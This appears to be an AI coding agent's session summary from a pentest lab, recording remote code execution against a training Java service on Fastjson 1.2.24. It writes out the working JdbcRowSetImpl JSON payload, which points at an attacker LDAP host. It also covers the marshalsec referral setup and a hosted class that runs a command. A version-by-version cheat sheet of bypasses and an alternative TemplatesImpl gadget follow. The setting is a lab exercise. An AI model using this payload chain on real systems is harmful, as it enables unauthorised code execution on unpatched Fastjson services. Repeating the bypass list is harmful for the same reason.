thread_id: 019056b7-1d29-7b4c-9df7-4a3c8b6f3e07
updated_at: 2026-06-09T11:19:30+00:00
rollout_path: C:\Users\<USER>\.codex\sessions\2026\06\09\rollout-2026-06-09T18-45-30-019056b7-1d29-7b4c-9df7-4a3c8b6f3e07.jsonl
cwd: \\?\C:\Workspace\pentest-lab

# Achieved RCE via Fastjson 1.2.24 unmarshal on a training Java service — LDAP-based JdbcRowSetImpl chain.

Rollout context: cwd was `C:\Workspace\pentest-lab`, lab Java service using Fastjson 1.2.24 for JSON body parsing. Purpose was the classic Fastjson unmarshal RCE exercise.

## Task 1: `@type` → JdbcRowSetImpl → LDAP → JNDI reference → RCE

Outcome: success

Preference signals:
- Chinese narration; payloads in English JSON.
- The user wanted the LDAP referral hosting flow captured — LDAP server + HTTP file server + JSON payload — as one script.

Key steps:
- Confirmed Fastjson via a version probe: sent `{"@type":"java.lang.AutoCloseable"}` and got a Fastjson-flavored parse error.
- Started marshalsec LDAP referral to `http://<attacker>:8888/#Exploit`.
- Hosted `Exploit.class` on a local HTTP server; class static block runs `Runtime.exec("cmd.exe /c calc.exe")`.
- Sent JSON: `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<attacker>:1389/Exploit","autoCommit":true}`.
- Target executed calc.exe.

Failures and how to do differently:
- Fastjson 1.2.25+ blocks JdbcRowSetImpl by default; had to confirm version 1.2.24 first.
- LDAP referral must respond correctly — marshalsec's default is fine; a hand-rolled LDAP responder failed on the referral phase.

Reusable knowledge:
- Fastjson gadget-chain-by-version cheat: 1.2.24 = JdbcRowSetImpl direct; 1.2.25-1.2.41 = double-quote bypass; 1.2.42-1.2.47 = L-prefixed class; 1.2.48+ = safeMode blocks all.
- The `autoCommit:true` field forces the connection open during parse, triggering the LDAP lookup.
- Alt gadget: `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` for offline payloads (no LDAP needed).

References:
- [1] Payload: `fastjson_1224.json`
- [2] Target: lab Java service on Fastjson 1.2.24
- [3] Reference: Chaitin Tech Fastjson RCE catalog
